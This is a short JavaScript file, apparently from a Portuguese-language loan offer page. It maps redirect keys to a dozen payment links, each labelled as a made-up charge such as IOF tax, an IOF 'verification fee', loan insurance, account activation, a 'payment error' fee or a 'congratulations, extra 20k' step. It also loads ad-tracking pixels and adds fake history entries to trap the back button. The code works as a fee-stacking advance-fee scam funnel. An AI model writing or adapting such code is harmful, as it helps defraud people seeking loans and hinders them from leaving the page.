const baseLinks = {
    up1: "https://pay.kitt-hoje.store/YL9jZDWBalO3p4q", // IOF
    up2: "https://pay.kitt-hoje.store/nOzxZoownMvZJ07", // Taxa de verificação de IOF
    up3: "https://pay.kitt-hoje.store/lqv130yKDzdZxbj", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.kitt-hoje.store/PyE2Zy8w1L43qRb", // NFe
    up5: "https://pay.kitt-hoje.store/7vJOGY4k1qPZKXd", // Ativar conta
    up6: "https://pay.kitt-hoje.store/a9ArZMlBk4n37xj", // Taxa de registro do contrato
    up7: "https://pay.kitt-hoje.store/NDr8gmKwB0JZBmj", // Parabéns, 20k adicional
    up8: "https://pay.kitt-hoje.store/N1nVZpYwBAWGlM6", // Erro no pagamento - 14,06
    up9: "https://pay.kitt-hoje.store/kYL6geWNOqpZrKM", // APP - 11,99
    up10:"https://pay.kitt-hoje.store/DPXw3Xea05MZzmpj", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.kitt-hoje.store/eApQgz2wQnVgEb7",// Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.kitt-hoje.store/mwK436dB7y4GQ8b" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}



// UTMIFY, troque o pixel só aqui, belê?
(function() {
 window.googlePixelId = "689b878652af6d331262cdad";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
  document.head.appendChild(a);
})();


(function() {
    const script = document.createElement('script');
    
    script.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    script.setAttribute('data-utmify-prevent-xcod-sck', '');
    script.setAttribute('data-utmify-prevent-subids', '');
    script.async = true;
    script.defer = true;

    document.head.appendChild(script);
})();


// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);

history.pushState({}, '', location.href);

